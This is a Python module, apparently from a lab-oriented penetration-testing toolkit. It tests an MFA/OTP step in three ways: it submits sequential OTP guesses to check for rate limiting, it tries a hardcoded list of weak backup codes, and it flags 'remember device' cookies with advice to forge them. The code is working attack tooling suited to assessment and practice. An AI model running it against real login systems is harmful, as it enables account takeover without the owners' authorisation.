"""2FA/MFA bypass vectors.

Run once auth_analysis.check_mfa_otp_indicators has flagged an
MFA/OTP step. Tests three common THM-box weaknesses:
  - no rate limiting on OTP submission (reuses the attempt-loop
    pattern from auth_analysis.check_account_lockout)
  - backup/recovery code brute force with a short pattern set
  - "remember this device" cookie that can be set/replayed without
    ever completing MFA
"""

import time

import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

OTP_FIELD_HINTS = ("otp", "code", "token", "pin", "verification")
REMEMBER_COOKIE_HINTS = ("remember", "trusted", "device", "skip_mfa", "mfa_verified")

# Short, THM-plausible backup-code guesses - not a real brute force,
# just the handful of patterns people actually reuse in lab boxes.
BACKUP_CODE_GUESSES = [
    "000000", "123456", "111111", "000000-0000", "backup123",
    "recovery", "12345678", "00000000",
]


def _get(url, timeout=8, **kwargs):
    kwargs.setdefault("allow_redirects", True)
    try:
        return requests.get(url, timeout=timeout, verify=False, **kwargs)
    except requests.RequestException:
        return None


def _extract_otp_form(html, page_url):
    soup = BeautifulSoup(html or "", "html.parser")
    form = soup.find("form")
    if not form:
        return None
    action = form.get("action") or page_url
    if not action.startswith("http"):
        from urllib.parse import urljoin
        action = urljoin(page_url, action)
    method = (form.get("method") or "post").lower()

    otp_field = None
    extra_fields = {}
    for inp in form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        itype = (inp.get("type") or "text").lower()
        if itype == "hidden":
            extra_fields[name] = inp.get("value", "")
        elif not otp_field and (itype in ("text", "tel", "number") or
                                 any(h in name.lower() for h in OTP_FIELD_HINTS)):
            otp_field = name
    if not otp_field:
        return None
    return {"action": action, "method": method, "otp_field": otp_field, "extra_fields": extra_fields}


def test_rate_limiting(otp_url, attempts=8, report=None):
    resp = _get(otp_url)
    if not resp:
        return None
    form = _extract_otp_form(resp.text, otp_url)
    if not form:
        return None

    session = requests.Session()
    session.verify = False
    lockout_keywords = ["locked", "too many attempts", "try again later", "temporarily disabled"]
    blocked = False
    start = time.time()
    for i in range(attempts):
        payload = dict(form["extra_fields"])
        payload[form["otp_field"]] = f"{i:06d}"
        try:
            resp = session.post(form["action"], data=payload, timeout=6, verify=False) \
                if form["method"] == "post" else \
                session.get(form["action"], params=payload, timeout=6, verify=False)
        except requests.RequestException:
            continue
        if any(k in (resp.text or "").lower() for k in lockout_keywords):
            blocked = True
            break
    elapsed = time.time() - start

    if report:
        if blocked:
            report.add_finding("MFA Bypass Testing", "OTP endpoint enforces rate limiting",
                                f"Lockout triggered within {attempts} attempt(s)", "INFO")
        else:
            report.add_finding(
                "MFA Bypass Testing", "No rate limiting on OTP/2FA submission",
                f"{attempts} guesses against {otp_url} in {elapsed:.1f}s with no lockout - "
                "a 6-digit OTP is brute-forceable (1,000,000 combinations) without throttling.",
                "HIGH", vuln_id="mfa_bypass",
            )
    return {"blocked": blocked, "elapsed": elapsed}


def test_backup_codes(otp_url, report=None):
    resp = _get(otp_url)
    if not resp:
        return None
    form = _extract_otp_form(resp.text, otp_url)
    if not form:
        return None

    baseline_len = len(resp.text or "")
    for guess in BACKUP_CODE_GUESSES:
        payload = dict(form["extra_fields"])
        payload[form["otp_field"]] = guess
        try:
            attempt = requests.post(form["action"], data=payload, timeout=6, verify=False) \
                if form["method"] == "post" else \
                requests.get(form["action"], params=payload, timeout=6, verify=False)
        except requests.RequestException:
            continue

        looks_failure = any(k in (attempt.text or "").lower()
                             for k in ("invalid", "incorrect", "expired", "error"))
        if abs(len(attempt.text or "") - baseline_len) > 200 and not looks_failure:
            if report:
                report.add_finding(
                    "MFA Bypass Testing", f"Weak backup/recovery code accepted: '{guess}'",
                    f"Submitted to {form['action']} - response differed from baseline without "
                    "a failure indicator. Verify manually.", "CRITICAL", vuln_id="mfa_bypass",
                )
            return {"code": guess}
    return None


def test_remember_device_cookie(login_url, report=None):
    resp = _get(login_url)
    if not resp:
        return None
    suspicious = [c.name for c in resp.cookies
                  if any(h in c.name.lower() for h in REMEMBER_COOKIE_HINTS)]
    if suspicious and report:
        report.add_finding(
            "MFA Bypass Testing", f"'Remember device' style cookie present: {', '.join(suspicious)}",
            "If this cookie can be set client-side (e.g. with any truthy/guessable value) before "
            "completing MFA, it may allow skipping the OTP step entirely. Try setting it manually "
            "and requesting a protected page.", "MEDIUM", vuln_id="mfa_bypass",
        )
    return suspicious or None


def run(otp_url, login_url=None, report=None):
    results = {}
    results["rate_limit"] = test_rate_limiting(otp_url, report=report)
    results["backup_code"] = test_backup_codes(otp_url, report=report)
    results["remember_cookie"] = test_remember_device_cookie(login_url or otp_url, report=report)
    return results
